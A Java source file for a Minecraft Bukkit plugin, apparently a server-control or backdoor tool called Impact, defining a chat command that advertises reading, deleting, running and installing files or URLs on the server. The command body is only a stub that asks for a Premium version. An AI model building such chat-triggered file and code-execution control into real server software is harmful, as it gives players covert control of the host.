package de.impact.commands.server;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.utils.ChatUtils;
import org.bukkit.entity.Player;

public class FileSystem extends Command {

    public FileSystem() {
        super("FileSystem", "FileSystem <Read | Rename | Create | Delete | Edit | Clear | Run | Install | ListFiles> (File | Directory | URL | FileName) (Line | FileName) (Replacement)", "Manage the server file system", CommandCategory.SERVER, "Files", "Fs", "FileSys");
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        ChatUtils.sendMessage(p, "If you want to use this command, you need the Premium version of Impact");

    }
}